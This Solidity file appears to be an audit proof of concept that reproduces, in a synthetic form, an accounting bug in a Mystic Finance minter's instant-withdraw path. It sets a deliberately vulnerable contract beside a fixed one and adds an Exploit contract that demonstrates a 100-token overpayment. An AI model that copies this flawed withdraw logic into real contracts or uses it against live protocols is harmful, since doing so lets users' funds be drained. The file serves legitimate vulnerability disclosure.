// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Mystic Finance — instant withdraw leaves currentWithheldETH unchanged (Kann)
    SYNTHETIC, cheatcode-free reduction.
    On the instant path withdrawn is set to amount, then currentWithheldETH
    adds withdrawn and subtracts amount. The withheld balance does not fall.
    The transfer pays `withdrawn`, which is the full amount, so the 10%
    instant fee is not kept. Alice is paid 1,000. The fair payout is 900.
    She is overpaid by 100. The books still show 1,000 withheld. */

contract EthToken {
    string public constant symbol = "ETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StPlumeMinter {
    uint256 public constant INSTANT_REDEMPTION_FEE = 1_000;
    uint256 public constant RATIO_PRECISION = 10_000;

    EthToken public ethToken;
    uint256 public currentWithheldETH;
    uint256 public withHoldEth;
    uint256 public paid;
    uint256 public fairPayout;

    constructor(EthToken token) {
        ethToken = token;
    }

    function fundWithheld(uint256 amount) external {
        currentWithheldETH = amount;
        ethToken.mint(address(this), amount);
    }

    function withdraw(address recipient, uint256 amount) external {
        uint256 fee;
        uint256 withdrawn;
        if (amount <= currentWithheldETH) {
            fee = amount * INSTANT_REDEMPTION_FEE / RATIO_PRECISION;
            withdrawn = amount;
        } else {
            fee = 0;
            withdrawn = 0;
        }
        uint256 cachedWithheldETH = currentWithheldETH;
        cachedWithheldETH = cachedWithheldETH;
        // @> VULN: instant path adds withdrawn and then subtracts amount, so currentWithheldETH does not fall
        currentWithheldETH += withdrawn;
        withHoldEth += fee;
        currentWithheldETH -= amount;
        uint256 payout = withdrawn;
        ethToken.transfer(recipient, payout);
        paid = payout;
        fairPayout = amount - fee;
    }
}

contract FixedMinter {
    uint256 public constant INSTANT_REDEMPTION_FEE = 1_000;
    uint256 public constant RATIO_PRECISION = 10_000;
    EthToken public ethToken;
    uint256 public currentWithheldETH;
    uint256 public withHoldEth;
    uint256 public paid;

    constructor(EthToken token) {
        ethToken = token;
    }

    function fundWithheld(uint256 amount) external {
        currentWithheldETH = amount;
        ethToken.mint(address(this), amount);
    }

    function withdraw(address recipient, uint256 amount) external {
        uint256 fee = amount * INSTANT_REDEMPTION_FEE / RATIO_PRECISION;
        currentWithheldETH -= amount;
        withHoldEth += fee;
        uint256 payout = amount - fee;
        ethToken.transfer(recipient, payout);
        paid = payout;
    }
}

contract Exploit {
    EthToken public ethToken;
    StPlumeMinter public minter;
    FixedMinter public fixedMinter;
    uint256 public constant AMOUNT = 1_000e18;

    constructor() {
        ethToken = new EthToken();
        minter = new StPlumeMinter(ethToken);
        fixedMinter = new FixedMinter(ethToken);
    }

    function run() external {
        minter.fundWithheld(AMOUNT);
        uint256 beforeWithheld = minter.currentWithheldETH();
        minter.withdraw(msg.sender, AMOUNT);
        uint256 afterWithheld = minter.currentWithheldETH();
        uint256 paid = minter.paid();
        uint256 fair = minter.fairPayout();
        fixedMinter.fundWithheld(AMOUNT);
        fixedMinter.withdraw(address(0xF1), AMOUNT);
        require(beforeWithheld == AMOUNT, "seed");
        require(afterWithheld == AMOUNT, "withheld unchanged");
        require(paid == AMOUNT, "paid full");
        require(fair == 900e18, "fair 900");
        require(paid - fair == 100e18, "overpaid 100");
        require(ethToken.balanceOf(msg.sender) == AMOUNT, "alice received 1000");
        require(fixedMinter.paid() == 900e18, "control pays 900");
        require(fixedMinter.currentWithheldETH() == 0, "control withheld");
        require(fixedMinter.withHoldEth() == 100e18, "control keeps fee");
    }
}
